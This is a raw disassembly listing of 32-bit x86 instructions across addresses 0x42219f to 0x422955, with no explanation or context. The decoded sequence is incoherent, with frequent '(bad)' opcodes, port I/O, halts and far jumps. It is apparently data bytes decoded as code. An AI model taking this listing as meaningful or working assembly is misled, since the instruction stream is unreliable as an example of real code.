  42219f:	cs adc eax,0xc6f3a26e
  4221a5:	dec    esi
  4221a6:	and    BYTE PTR [esi-0x55ed6c08],dh
  4221ac:	xchg   ecx,eax
  4221ad:	push   ds
  4221ae:	data16 mov ?,WORD PTR [ebp-0xb6a3973]
  4221b5:	sbb    ecx,DWORD PTR [ecx+0x6f]
  4221b8:	sbb    edi,ebp
  4221ba:	mov    edx,DWORD PTR [esi]
  4221bc:	cmp    ecx,DWORD PTR [eax+0x42e366d4]
  4221c2:	loop   0x422202
  4221c4:	or     eax,DWORD PTR [edx+0x61]
  4221c7:	outs   dx,DWORD PTR ds:[esi]
  4221c8:	jecxz  0x4221fd
  4221ca:	xchg   esp,eax
  4221cb:	dec    esp
  4221cc:	daa    
  4221cd:	add    BYTE PTR [eax],al
  4221cf:	add    BYTE PTR [eax],al
  4221d1:	add    cl,bl
  4221d3:	mov    dh,0x66
  4221d5:	sbb    ebp,DWORD PTR [edi-0x25]
  4221d8:	std    
  4221d9:	neg    BYTE PTR [esi]
  4221db:	sub    esp,DWORD PTR [ebx-0x23]
  4221de:	mov    BYTE PTR [edx-0x275123b6],ah
  4221e4:	add    DWORD PTR [eax],eax
  4221e6:	arpl   WORD PTR [eax],ax
  4221e8:	add    BYTE PTR [eax],al
  4221ea:	xchg   ebx,esi
  4221ec:	loope  0x422239
  4221ee:	imul   ebx,DWORD PTR [eax+0x60d3119e],0xc8556446
  4221f8:	arpl   WORD PTR [edi+0x75d589d0],bx
  4221fe:	jmp    0xfa45:0x10fd2588
  422205:	mov    ch,0x16
  422207:	test   al,0x70
  422209:	lahf   
  42220a:	out    0xcf,eax
  42220c:	into   
  42220d:	push   ecx
  42220e:	ret    
  42220f:	out    dx,eax
  422210:	enter  0x590,0xe4
  422214:	ds sbb eax,0xc79c1642
  42221a:	cmp    dh,BYTE PTR [ecx+edx*2]
  42221d:	mov    ebp,0xd9e9b344
  422222:	jmp    0x4222a1
  422224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422225:	mov    ?,WORD PTR [esi+ebx*1+0x6b]
  422229:	sbb    al,0x3d
  42222b:	xor    al,0xb7
  42222d:	mov    ebp,ds
  42222f:	aas    
  422230:	mov    dl,0x14
  422232:	lahf   
  422233:	push   ss
  422234:	inc    ebx
  422235:	dec    esp
  422236:	imul   eax,esp,0xd580fa1b
  42223c:	shr    BYTE PTR [edi-0x2da2bdf7],0x26
  422243:	fnstcw WORD PTR ds:[ebp-0x3b]
  422247:	mov    eax,0x42b259e
  42224c:	sub    al,0x0
  42224e:	add    BYTE PTR [eax],al
  422250:	add    BYTE PTR [eax],al
  422252:	fidiv  DWORD PTR [edx]
  422254:	xchg   edi,eax
  422255:	mov    bh,bh
  422257:	scas   eax,DWORD PTR es:[edi]
  422258:	fbstp  TBYTE PTR [edx+0x3]
  42225b:	inc    ebp
  42225c:	mov    ds:0xa17d025c,eax
  422261:	(bad)  
  422262:	adc    ecx,ebx
  422264:	add    DWORD PTR [eax],eax
  422266:	arpl   WORD PTR [eax],ax
  422268:	add    BYTE PTR [eax],al
  42226a:	inc    ebx
  42226b:	aaa    
  42226c:	dec    esi
  42226d:	arpl   WORD PTR ds:0x9648f1dd,bx
  422273:	add    al,0x3d
  422275:	inc    edx
  422276:	nop
  422277:	ficomp WORD PTR ds:0x3885afc2
  42227d:	pop    ds
  42227e:	sti    
  42227f:	les    edx,FWORD PTR [ecx+ebp*1+0x4912a153]
  422286:	addr16 out dx,al
  422288:	adc    DWORD PTR [esp+ebx*1],edx
  42228b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42228c:	inc    esi
  42228d:	xor    al,0x88
  42228f:	(bad)  [edx+0x4a]
  422292:	push   edx
  422293:	xor    al,0xab
  422295:	test   DWORD PTR [edx-0x7e7b3c56],ebp
  42229b:	adc    BYTE PTR [eax],cl
  42229d:	cwde   
  42229e:	pop    esp
  42229f:	cmp    DWORD PTR [eax+edx*8],ecx
  4222a2:	ins    BYTE PTR es:[edi],dx
  4222a3:	mov    dh,0x2c
  4222a5:	or     eax,0xca96163e
  4222aa:	mov    ebp,0x885ed7f9
  4222af:	xchg   BYTE PTR [ecx],bl
  4222b1:	dec    edx
  4222b2:	adc    eax,esi
  4222b4:	jbe    0x422259
  4222b6:	jbe    0x4222a6
  4222b8:	hlt    
  4222b9:	or     DWORD PTR [esi],esp
  4222bb:	packssdw mm5,QWORD PTR [eax-0xc]
  4222bf:	icebp  
  4222c0:	mov    bl,0x7
  4222c2:	sub    BYTE PTR [edi-0x268e6394],ah
  4222c8:	lock jge 0x422346
  4222cb:	mov    BYTE PTR [eax+eax*1+0x0],0x48
  4222d3:	in     al,0x3
  4222d5:	fwait
  4222d6:	scas   eax,DWORD PTR es:[edi]
  4222d7:	(bad)  
  4222d8:	fdiv   st,st(7)
  4222da:	pop    esi
  4222db:	sub    BYTE PTR [eax+0x2b0fa28f],bl
  4222e1:	add    DWORD PTR [ecx+ebx*8+0x1],esi
  4222e5:	add    BYTE PTR [ebx+0x0],ah
  4222e8:	add    BYTE PTR [eax],al
  4222ea:	fbld   TBYTE PTR [edx-0x44]
  4222ed:	daa    
  4222ee:	xchg   ecx,eax
  4222ef:	stos   DWORD PTR es:[edi],eax
  4222f0:	in     al,0x55
  4222f2:	push   es
  4222f3:	(bad)  
  4222f4:	out    dx,eax
  4222f5:	frstor [edx+0x6e1c8afa]
  4222fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222fc:	test   al,0xdf
  4222fe:	(bad)  
  4222ff:	xchg   edi,eax
  422300:	mov    eax,0x834c86df
  422305:	push   ss
  422306:	in     eax,dx
  422307:	cwde   
  422308:	call   0xbe249b57
  42230d:	test   esp,esp
  42230f:	iret   
  422310:	daa    
  422311:	mov    eax,ds:0x8d9dcaff
  422316:	inc    esp
  422317:	(bad)  
  422318:	xor    bl,BYTE PTR [esi]
  42231a:	mov    bl,dl
  42231c:	cs enter 0x9e0b,0xfe
  422321:	jge    0x4222cc
  422323:	call   0xe8b01933
  422328:	lods   eax,DWORD PTR ds:[esi]
  422329:	inc    edi
  42232a:	rcr    eax,cl
  42232c:	nop
  42232d:	mov    ebx,0xf14fa94e
  422332:	xor    esi,DWORD PTR [edx-0x76e3df0d]
  422338:	and    al,0xe2
  42233a:	push   es
  42233b:	sbb    ecx,DWORD PTR [edi-0x7e76ddc5]
  422341:	call   0x3f1:0xb1719afc
  422348:	(bad)  
  42234a:	xchg   BYTE PTR [ecx],dh
  42234c:	mov    dl,0x0
  42234e:	add    BYTE PTR [eax],al
  422350:	add    BYTE PTR [eax],al
  422352:	push   edx
  422353:	add    al,0xa2
  422355:	xor    dh,0xa6
  422358:	jb     0x42232e
  42235a:	ins    DWORD PTR es:[edi],dx
  42235b:	xor    dh,BYTE PTR [edx]
  42235d:	and    eax,0xcca7a31a
  422362:	xlat   BYTE PTR ds:[ebx]
  422363:	fld    DWORD PTR [ecx]
  422365:	add    BYTE PTR [ebx+0x0],ah
  422368:	add    BYTE PTR [eax],al
  42236a:	rcr    DWORD PTR [edx+0x2341d6c6],1
  422370:	jmp    0x422385
  422372:	sahf   
  422373:	and    ebx,ebp
  422375:	cmc    
  422376:	mov    bl,0x7d
  422378:	sti    
  422379:	(bad)  
  42237a:	sub    BYTE PTR [edx+eiz*4+0x3fc69909],dh
  422381:	fnstsw WORD PTR [ebp+0x7f]
  422384:	mov    ebp,0x3fc1da1
  422389:	dec    esp
  42238a:	push   edi
  42238b:	add    edi,DWORD PTR [edx+0x609ab9a4]
  422391:	push   0x165b311a
  422396:	jne    0x4223c1
  422398:	adc    eax,0x33c43cce
  42239d:	jns    0x422397
  42239f:	(bad)  
  4223a0:	arpl   WORD PTR [edx-0x4b],sp
  4223a3:	mov    ch,0x92
  4223a5:	mov    ah,0xc8
  4223a7:	test   al,0xba
  4223a9:	mov    bh,0xc8
  4223ab:	jbe    0x4223da
  4223ad:	fsub   QWORD PTR [ebx+0x5c]
  4223b0:	pop    eax
  4223b1:	and    DWORD PTR [eax+edx*4],0x5fac96bc
  4223b8:	mov    eax,0xfded538f
  4223bd:	loop   0x4223ba
  4223bf:	adc    eax,0x5770495b
  4223c4:	pusha  
  4223c5:	dec    eax
  4223c6:	sti    
  4223c7:	inc    esi
  4223c8:	aam    0xa4
  4223ca:	pop    esp
  4223cb:	aaa    
  4223cc:	enter  0x0,0x0
  4223d0:	add    BYTE PTR [eax],al
  4223d2:	cmp    BYTE PTR [edx-0x6a],ch
  4223d5:	add    edx,esi
  4223d7:	(bad)  
  4223d8:	mov    ebp,0xdb4ef67b
  4223dd:	out    0x1e,eax
  4223df:	(bad)  
  4223e0:	lahf   
  4223e1:	jne    0x42241d
  4223e3:	fiadd  DWORD PTR [ecx]
  4223e5:	add    BYTE PTR [ebx+0x0],ah
  4223e8:	add    BYTE PTR [eax],al
  4223ea:	lds    eax,FWORD PTR [edx+0x2]
  4223ed:	ds xchg edx,eax
  4223ef:	stos   DWORD PTR es:[edi],eax
  4223f0:	stc    
  4223f1:	mov    eax,ds:0xe79c57c1
  4223f6:	xchg   esp,eax
  4223f7:	(bad)  
  4223f8:	sbb    esp,esi
  4223fa:	xchg   edx,eax
  4223fb:	pop    ss
  4223fc:	es cdq 
  4223fe:	or     BYTE PTR [edx],ch
  422400:	push   ebx
  422401:	mov    ecx,esi
  422403:	repnz xchg esi,eax
  422405:	fcmovb st,st(6)
  422407:	fs pop esp
  422409:	retf   0x6203
  42240c:	popf   
  42240d:	dec    eax
  42240e:	sub    ah,0x8e
  422411:	fstp   st(2)
  422413:	push   ebp
  422414:	xlat   BYTE PTR ds:[ebx]
  422415:	inc    edi
  422416:	and    BYTE PTR [eax-0x4134beee],bh
  42241c:	xchg   esi,eax
  42241d:	stc    
  42241e:	fmul   QWORD PTR [edi]
  422420:	inc    ebp
  422421:	sti    
  422422:	shr    BYTE PTR cs:[ebx+0x41952296],cl
  422429:	or     ebx,DWORD PTR [edi+0x21b91143]
  42242f:	scas   al,BYTE PTR es:[edi]
  422430:	sbb    al,0xd7
  422432:	in     eax,0x42
  422434:	inc    eax
  422435:	push   ebx
  422436:	fdiv   DWORD PTR [ebx+0x47]
  422439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42243a:	rcl    esi,1
  42243c:	inc    edx
  42243d:	mov    eax,ds:0xdd277fe8
  422442:	xor    BYTE PTR [ecx+edx*8-0x266b3d17],0xc
  42244a:	stc    
  42244b:	out    dx,eax
  42244c:	loop   0x42244e
  42244e:	add    BYTE PTR [eax],al
  422450:	add    BYTE PTR [eax],al
  422452:	jmp    0x7a729f10
  422457:	repz jmp 0x422453
  42245a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42245e:	pop    edx
  42245f:	mov    edi,0xda9da259
  422464:	add    DWORD PTR [eax],eax
  422466:	arpl   WORD PTR [eax],ax
  422468:	add    BYTE PTR [eax],al
  42246a:	jne    0x422448
  42246c:	lods   al,BYTE PTR ds:[esi]
  42246d:	sbb    BYTE PTR [ebx-0x199916f7],dh
  422473:	xor    dh,BYTE PTR [edi]
  422475:	imul   edi,DWORD PTR [ecx-0x73204e79],0x5a29f71a
  42247f:	std    
  422480:	repnz push eax
  422482:	nop
  422483:	xchg   edx,eax
  422484:	xchg   edx,eax
  422485:	pop    esi
  422486:	or     al,0xfd
  422488:	pop    esi
  422489:	and    ebp,DWORD PTR [ecx+0x1c]
  42248c:	or     BYTE PTR [edi+0x1b],0xa4
  422490:	dec    edi
  422491:	int3   
  422492:	ret    0x30d
  422495:	in     al,dx
  422496:	xchg   esi,eax
  422497:	js     0x422457
  422499:	cmp    al,0x89
  42249b:	(bad)  
  42249c:	les    esi,FWORD PTR [eax+0x7d5bd9dd]
  4224a2:	mov    edx,0x4fec1433
  4224a7:	loope  0x4224cf
  4224a9:	test   ch,0xa5
  4224ac:	inc    esi
  4224ad:	lds    edx,FWORD PTR [esi]
  4224af:	xor    DWORD PTR ds:0x65c878fb,eax
  4224b5:	xor    al,0x48
  4224b7:	pop    ebp
  4224b8:	mov    cl,0xbc
  4224ba:	fld    DWORD PTR [ebx-0x1693f88d]
  4224c0:	mov    al,0x21
  4224c2:	test   al,0x95
  4224c4:	sbb    ch,BYTE PTR [ebx]
  4224c6:	popa   
  4224c7:	loope  0x4224dc
  4224c9:	lods   eax,DWORD PTR ds:[esi]
  4224ca:	fistp  DWORD PTR [edx+0x3]
  4224d0:	add    BYTE PTR [eax],al
  4224d2:	pop    ebx
  4224d3:	inc    ecx
  4224d4:	pop    ebx
  4224d5:	iret   
  4224d6:	pop    ebx
  4224d7:	(bad)  
  4224d9:	aad    0xf
  4224db:	ss dec esp
  4224dd:	dec    esi
  4224de:	out    dx,eax
  4224df:	push   edi
  4224e0:	mov    edi,0x1db00e8
  4224e5:	add    BYTE PTR [ebx+0x0],ah
  4224e8:	add    BYTE PTR [eax],al
  4224ea:	and    DWORD PTR [esi+0x1d95d0d4],ebx
  4224f0:	pop    edx
  4224f1:	fiadd  WORD PTR [ecx+0x10c4f770]
  4224f7:	aad    0xeb
  4224f9:	in     al,dx
  4224fa:	push   0x4b
  4224fc:	pushf  
  4224fd:	sbb    dl,BYTE PTR [ecx+ebp*1-0x4e]
  422501:	rcl    esp,0xa7
  422504:	push   cs
  422505:	and    bh,ah
  422507:	push   0x62412f06
  42250c:	mov    edi,DWORD PTR [edx-0x42015a26]
  422512:	retf   
  422513:	lahf   
  422514:	push   0xffffffd3
  422516:	push   ebx
  422517:	fsubr  st,st(3)
  422519:	nop
  42251a:	add    ch,BYTE PTR fs:[ecx+0x270a6233]
  422521:	push   es
  422522:	loopne 0x42256a
  422524:	int    0xb0
  422526:	mov    dl,0x2a
  422528:	cmp    DWORD PTR [edi],ebx
  42252a:	lock out dx,eax
  42252c:	rcl    DWORD PTR [ecx],0x17
  42252f:	push   ebx
  422530:	mov    esp,0xb0bc5759
  422535:	jg     0x422563
  422537:	sub    DWORD PTR [edx],0x484b1eda
  42253d:	into   
  42253e:	mov    ecx,0x5e9e1a78
  422543:	(bad)  
  422544:	mov    al,0x18
  422546:	push   cs
  422547:	jae    0x4224dc
  422549:	nop
  42254a:	lods   al,BYTE PTR ds:[esi]
  42254b:	mov    es,WORD PTR [edi]
  42254d:	add    BYTE PTR [eax],al
  42254f:	add    BYTE PTR [eax],al
  422551:	add    BYTE PTR [ebx+0x7f3c6585],bl
  422557:	cld    
  422558:	(bad)  [edi-0x65be08a1]
  42255e:	push   cs
  42255f:	iret   
  422560:	(bad)  
  422561:	adc    eax,0x1db63
  422566:	arpl   WORD PTR [eax],ax
  422568:	add    BYTE PTR [eax],al
  42256a:	sbb    BYTE PTR [ebx],cl
  42256c:	push   0x65
  42256e:	shl    BYTE PTR [ebx-0x34160629],cl
  422574:	sub    eax,0xd2171f93
  422579:	dec    esi
  42257a:	jb     0x422569
  42257c:	ret    
  42257d:	test   eax,0x87bfc4be
  422582:	sahf   
  422583:	loope  0x4225d3
  422585:	out    dx,al
  422586:	fmul   DWORD PTR [edx+eiz*2]
  422589:	jmp    0x4406:0x1d6ba95f
  422590:	mov    ch,0x97
  422592:	(bad)  
  422593:	cwde   
  422594:	dec    ebp
  422595:	dec    eax
  422596:	lock les eax,FWORD PTR [ebx+0x2d]
  42259a:	fistp  WORD PTR [esi]
  42259c:	pop    edx
  42259d:	mov    eax,0xbf6b02f7
  4225a2:	mul    DWORD PTR [edx+0x180758da]
  4225a8:	ficomp WORD PTR ds:0xc35807b0
  4225ae:	sub    al,0x80
  4225b0:	imul   ebx,ebp,0xe9fa379
  4225b6:	sub    esp,edi
  4225b8:	adc    BYTE PTR [esp+ebx*8+0x3],al
  4225bc:	aaa    
  4225bd:	stos   BYTE PTR es:[edi],al
  4225be:	jmp    0x136b0fe0
  4225c3:	add    BYTE PTR ds:0x60bb2b76,al
  4225c9:	test   eax,0xc98ca4
  4225ce:	add    BYTE PTR [eax],al
  4225d0:	add    BYTE PTR [eax],al
  4225d2:	outs   dx,BYTE PTR ds:[esi]
  4225d3:	jae    0x4225c5
  4225d5:	retf   0xcbfd
  4225d8:	jle    0x4225d1
  4225da:	repz xor eax,0x428b8ce9
  4225e0:	push   cs
  4225e1:	lock (bad) 
  4225e3:	fild   DWORD PTR [ecx]
  4225e5:	add    BYTE PTR [ebx+0x0],ah
  4225e8:	add    BYTE PTR [eax],al
  4225ea:	mul    BYTE PTR [esi+0x19]
  4225ed:	ins    BYTE PTR es:[edi],dx
  4225ee:	ficom  DWORD PTR [edx+eiz*8]
  4225f1:	scas   al,BYTE PTR es:[edi]
  4225f2:	xor    al,0xa6
  4225f4:	mov    gs,ecx
  4225f6:	test   ecx,0x9cd76b2c
  4225fc:	pop    edx
  4225fd:	mov    ds:0x5c359864,al
  422602:	inc    ebp
  422603:	dec    ebx
  422604:	fnsave [eax+0x1df6951a]
  42260a:	inc    edx
  42260b:	jg     0x422592
  42260d:	sbb    ah,BYTE PTR [edx]
  42260f:	or     al,0x23
  422611:	lods   eax,DWORD PTR ds:[esi]
  422612:	add    al,0xde
  422614:	ds mov dl,0xc
  422617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422618:	mov    WORD PTR [edx+0x23],ss
  42261b:	std    
  42261c:	(bad)  
  42261d:	cmp    al,0x3c
  42261f:	daa    
  422620:	dec    ecx
  422621:	sbb    DWORD PTR [edi+0x3b37cba1],esi
  422627:	stos   DWORD PTR es:[edi],eax
  422628:	pop    eax
  422629:	or     al,0xae
  42262b:	jle    0x42263e
  42262d:	xchg   ebx,eax
  42262e:	retf   0x897
  422631:	mov    ch,0x43
  422633:	mov    bh,0xa6
  422635:	xchg   edx,eax
  422636:	shr    BYTE PTR [ecx],cl
  422638:	sbb    DWORD PTR [ebp-0x59782859],edx
  42263e:	into   
  42263f:	xchg   DWORD PTR [esi],esi
  422641:	pop    ebp
  422642:	sub    al,0x4f
  422644:	mov    edx,0x33401632
  422649:	in     al,0x15
  42264b:	push   edx
  42264c:	push   ebx
  42264d:	add    BYTE PTR [eax],al
  42264f:	add    BYTE PTR [eax],al
  422651:	add    ch,dh
  422653:	adc    al,0xae
  422655:	adc    ebp,edi
  422657:	mov    ebx,0x84e6f6fd
  42265c:	lds    ebp,FWORD PTR [edx+0x651c48c2]
  422662:	sub    esp,ebx
  422664:	add    DWORD PTR [eax],eax
  422666:	arpl   WORD PTR [eax],ax
  422668:	add    BYTE PTR [eax],al
  42266a:	jp     0x4226e7
  42266c:	or     dh,BYTE PTR [esi-0x77efbce3]
  422672:	sbb    BYTE PTR [ebp+0x2b],dh
  422675:	pop    eax
  422676:	mov    BYTE PTR [ecx+ebp*4-0x41],dh
  42267a:	js     0x4226ae
  42267c:	test   eax,0xcb73159b
  422681:	or     eax,0xd511ceab
  422686:	push   0x96db3e4c
  42268b:	rol    BYTE PTR [edx+ebp*4+0x70a34ca9],1
  422692:	fisttp QWORD PTR [ebx+0x580289e0]
  422698:	sub    eax,0xbe55defd
  42269d:	or     BYTE PTR [eax+0x16],dl
  4226a0:	pop    ecx
  4226a1:	or     DWORD PTR [ebx+0x6b],esi
  4226a4:	retf   
  4226a5:	inc    edx
  4226a6:	shl    DWORD PTR cs:[esi+0x39a67b99],cl
  4226ad:	pushf  
  4226ae:	cmp    DWORD PTR [ebx-0x62],eax
  4226b1:	add    al,0xa4
  4226b3:	cld    
  4226b4:	aam    0xa3
  4226b6:	and    DWORD PTR [edi-0x7e],esp
  4226b9:	nop
  4226ba:	xchg   edx,eax
  4226bb:	push   ebx
  4226bc:	xor    dl,BYTE PTR [esi+edi*4+0xab81f7e]
  4226c3:	add    BYTE PTR ds:0x5585a829,dl
  4226c9:	jge    0x42264e
  4226cb:	mov    ecx,DWORD PTR [eax+eax*1+0x0]
  4226d2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226d8:	mov    edi,0xbb1c16fb
  4226dd:	shl    BYTE PTR [esi+0x24],0x64
  4226e1:	mov    dh,0x8c
  4226e3:	fadd   QWORD PTR [ecx]
  4226e5:	add    BYTE PTR [ebx+0x0],ah
  4226e8:	add    BYTE PTR [eax],al
  4226ea:	cmp    dh,ch
  4226ec:	sbb    DWORD PTR [esp+edx*2+0xfcf946a],ebp
  4226f3:	aam    0xbb
  4226f5:	mov    bh,0xe4
  4226f7:	loope  0x42275c
  4226f9:	push   ss
  4226fa:	fwait
  4226fb:	div    DWORD PTR [ecx-0x118a1fb5]
  422701:	aas    
  422702:	xor    bl,BYTE PTR [edx-0x38]
  422705:	mov    ds:0x3e7e317a,al
  42270a:	hlt    
  42270b:	jl     0x42269c
  42270d:	xor    eax,0x3f6595b2
  422712:	xchg   esp,eax
  422713:	mov    dl,0xae
  422715:	test   BYTE PTR es:[ecx+0x58f7cfd0],bh
  42271c:	jle    0x42269f
  42271e:	ret    0xa7a
  422721:	shl    DWORD PTR [ebx-0x148d9c77],cl
  422727:	pop    edi
  422728:	jae    0x422764
  42272a:	push   ds
  42272b:	xor    ah,BYTE PTR [ebp+0x34]
  42272e:	js     0x4226f6
  422730:	jnp    0x4226b7
  422732:	push   ecx
  422733:	pop    edi
  422734:	aas    
  422735:	outs   dx,BYTE PTR ds:[esi]
  422736:	jmp    0x42276f
  422738:	jne    0x42277d
  42273a:	mov    dl,0x3e
  42273c:	jmp    0xa0f25d96
  422741:	push   es
  422742:	int    0x3a
  422744:	daa    
  422745:	cmp    eax,0xeaf6f805
  42274a:	(bad)  
  42274b:	clc    
  42274c:	adc    al,BYTE PTR [eax]
  42274e:	add    BYTE PTR [eax],al
  422750:	add    BYTE PTR [eax],al
  422752:	aam    0xf
  422754:	push   ecx
  422755:	lock (bad) 
  422758:	cmc    
  422759:	das    
  42275a:	sbb    BYTE PTR [eax],cl
  42275c:	xchg   ebx,eax
  42275d:	iret   
  42275e:	pop    eax
  42275f:	push   edi
  422760:	push   cs
  422761:	xchg   edi,eax
  422762:	out    dx,eax
  422763:	fadd   QWORD PTR [ecx]
  422765:	add    BYTE PTR [ebx+0x0],ah
  422768:	add    BYTE PTR [eax],al
  42276a:	cmp    BYTE PTR [ebp+0x2],0xb5
  42276e:	jnp    0x422757
  422770:	scas   eax,DWORD PTR es:[edi]
  422771:	mov    al,ds:0xde120d9b
  422776:	cmp    ecx,DWORD PTR [esi]
  422778:	lods   eax,DWORD PTR ds:[esi]
  422779:	pop    ds
  42277a:	xlat   BYTE PTR ds:[ebx]
  42277b:	(bad)  
  42277c:	out    dx,eax
  42277d:	repnz pop eax
  42277f:	pop    eax
  422780:	js     0x42271b
  422782:	scas   eax,DWORD PTR es:[edi]
  422783:	lds    ecx,FWORD PTR [edi+0x7bcefdd0]
  422789:	jnp    0x422754
  42278b:	mov    bh,BYTE PTR [ecx+esi*2+0x64]
  42278f:	jb     0x422810
  422791:	sub    al,0x28
  422793:	adc    al,0x33
  422795:	repz push ebp
  422797:	pop    ds
  422798:	(bad)  
  422799:	sbb    bh,bl
  42279b:	retf   
  42279c:	sbb    ebp,ecx
  42279e:	leave  
  42279f:	mov    ecx,0xa4c7c97
  4227a4:	loop   0x422754
  4227a6:	shl    DWORD PTR [esi],0x35
  4227a9:	xchg   edx,eax
  4227aa:	in     eax,0x2
  4227ac:	(bad)  
  4227ad:	pop    edi
  4227ae:	setp   bh
  4227b1:	cmp    DWORD PTR [esi-0x3e542547],esp
  4227b7:	stos   DWORD PTR es:[edi],eax
  4227b8:	jns    0x4227c8
  4227ba:	pop    ebx
  4227bb:	sub    cl,BYTE PTR [eax-0x71]
  4227be:	dec    esp
  4227bf:	sbb    esi,ebp
  4227c1:	popa   
  4227c2:	loopne 0x4227c8
  4227c4:	and    al,BYTE PTR ds:0xe718a3df
  4227ca:	and    ecx,esp
  4227cc:	xchg   BYTE PTR [eax],al
  4227ce:	add    BYTE PTR [eax],al
  4227d0:	add    BYTE PTR [eax],al
  4227d2:	int    0x2d
  4227d4:	xchg   ebp,eax
  4227d5:	inc    ebx
  4227d6:	cmc    
  4227d7:	sti    
  4227d8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227de:	fs cld 
  4227e0:	push   ebx
  4227e1:	mov    al,ds:0x1dd52
  4227e6:	arpl   WORD PTR [eax],ax
  4227e8:	add    BYTE PTR [eax],al
  4227ea:	xor    esi,DWORD PTR [edi]
  4227ec:	sar    DWORD PTR [esi+eax*8+0x528498d],cl
  4227f3:	and    bh,BYTE PTR [edi]
  4227f5:	xchg   ecx,eax
  4227f6:	or     BYTE PTR [ecx+0x737794a4],cl
  4227fc:	mov    cl,BYTE PTR [edx+0xe27f2fc]
  422802:	cmp    DWORD PTR [edx-0x2a0d0301],0xffffffb9
  422809:	xor    BYTE PTR es:[esp+ebx*1],dh
  42280d:	es daa 
  42280f:	mov    ebx,0x772c4d07
  422814:	inc    ebp
  422815:	ja     0x42283d
  422817:	cmp    DWORD PTR [edi+0x2d],esi
  42281a:	popa   
  42281b:	test   esp,edi
  42281d:	outs   dx,DWORD PTR ds:[esi]
  42281e:	pop    ebp
  42281f:	je     0x4227e2
  422821:	test   ax,0x4b4d
  422825:	pop    esi
  422826:	push   edi
  422827:	dec    edx
  422828:	jle    0x4227ae
  42282a:	lock add BYTE PTR [ebp-0x6a],al
  42282e:	cmc    
  42282f:	mov    esp,0xdeb4d6e1
  422834:	xor    ebx,DWORD PTR [edx-0x68]
  422837:	mov    ecx,0xcf5af8fe
  42283c:	test   DWORD PTR [ebx-0x5c],0x278df8ed
  422843:	push   ecx
  422844:	xor    dl,BYTE PTR [ecx+0x3064a28b]
  42284a:	imul   DWORD PTR [esi+0x4f]
  42284d:	add    BYTE PTR [eax],al
  42284f:	add    BYTE PTR [eax],al
  422851:	add    BYTE PTR [ebx],dl
  422853:	fs out 0xb,eax
  422856:	test   DWORD PTR [ebx-0xce58301],0xa8204cfc
  422860:	cmp    al,0x37
  422862:	mov    ch,0xdd
  422864:	add    DWORD PTR [eax],eax
  422866:	arpl   WORD PTR [eax],ax
  422868:	add    BYTE PTR [eax],al
  42286a:	mul    DWORD PTR [edx]
  42286c:	dec    eax
  42286d:	jns    0x4228c8
  42286f:	fpatan 
  422871:	sub    esp,DWORD PTR [ecx]
  422873:	sbb    eax,0xe8a1be12
  422878:	sub    cl,BYTE PTR [ebp+ecx*1-0x3c8032d8]
  42287f:	push   0x89bf1b9b
  422884:	or     BYTE PTR [esi+0x294c72fb],0x29
  42288b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42288c:	jb     0x422884
  42288e:	sub    eax,0x9e5e4709
  422893:	out    dx,al
  422894:	pop    ss
  422895:	push   ebx
  422896:	ret    
  422897:	out    0x8f,al
  422899:	and    eax,DWORD PTR [edx-0x50b6c69e]
  42289f:	imul   esp,edi,0x3dd5a64d
  4228a5:	ret    
  4228a6:	shr    BYTE PTR [ecx+0x1e],0xf2
  4228aa:	gs inc eax
  4228ac:	pushf  
  4228ad:	mov    edx,0xcf6b3125
  4228b2:	or     ebx,DWORD PTR [esi]
  4228b4:	retf   0x60ab
  4228b7:	xchg   ebp,eax
  4228b8:	pop    es
  4228b9:	push   esi
  4228ba:	cmp    al,0x97
  4228bc:	in     al,0x41
  4228be:	jmp    0x422922
  4228c0:	test   DWORD PTR [ebp-0x5a0476f],ecx
  4228c6:	mov    WORD PTR ds:0x952167f6,fs
  4228cc:	push   ecx
  4228cd:	add    BYTE PTR [eax],al
  4228cf:	add    BYTE PTR [eax],al
  4228d1:	add    BYTE PTR [esi],dh
  4228d3:	add    dl,BYTE PTR [ebp+0xc]
  4228d6:	jne    0x422937
  4228d8:	jg     0x422914
  4228da:	clc    
  4228db:	cs aas 
  4228dd:	push   0xbe710a75
  4228e2:	sub    al,0xd0
  4228e4:	add    DWORD PTR [eax],eax
  4228e6:	arpl   WORD PTR [eax],ax
  4228e8:	add    BYTE PTR [eax],al
  4228ea:	cmc    
  4228eb:	xchg   di,ax
  4228ed:	repz (bad) 
  4228f0:	es dec edx
  4228f2:	inc    BYTE PTR [esi+ecx*8]
  4228f5:	mov    esp,0xcbf2fd26
  4228fa:	dec    edi
  4228fb:	jb     0x4228d5
  4228fd:	and    ch,BYTE PTR [esi+0x14450169]
  422903:	push   ebp
  422904:	in     eax,0x49
  422906:	xchg   ebx,eax
  422907:	mov    edx,0xd1aafa20
  42290c:	mov    esp,eax
  42290e:	iret   
  42290f:	jnp    0x4228ed
  422911:	xchg   esp,eax
  422912:	stos   BYTE PTR es:[edi],al
  422913:	adc    BYTE PTR [ecx],ch
  422915:	hlt    
  422916:	sub    dh,BYTE PTR [esi+0x3a]
  422919:	inc    ebx
  42291a:	hlt    
  42291b:	js     0x422938
  42291d:	adc    cl,BYTE PTR [edx-0x1d]
  422920:	scas   eax,DWORD PTR es:[edi]
  422921:	hlt    
  422922:	in     al,0x68
  422924:	xchg   DWORD PTR [edx+0x284b9bbc],ecx
  42292a:	mov    dh,dh
  42292c:	sub    esi,ebp
  42292e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42292f:	or     BYTE PTR [ebx+ecx*4],dh
  422932:	inc    ebp
  422933:	daa    
  422934:	push   edx
  422935:	cwde   
  422936:	loopne 0x422966
  422938:	push   edi
  422939:	int3   
  42293a:	fucomip st,st(6)
  42293c:	(bad)  
  42293d:	jmp    0x206a5fc0
  422942:	repnz in al,dx
  422944:	mov    cl,0x57
  422946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422947:	(bad)  
  422948:	jg     0x4228f4
  42294a:	scas   eax,DWORD PTR es:[edi]
  42294b:	(bad)  [esi]
  42294d:	add    BYTE PTR [eax],al
  42294f:	add    BYTE PTR [eax],al
  422951:	add    BYTE PTR [eax],cl
  422953:	mov    cl,0x72
  422955:	cmp    edi,ebx
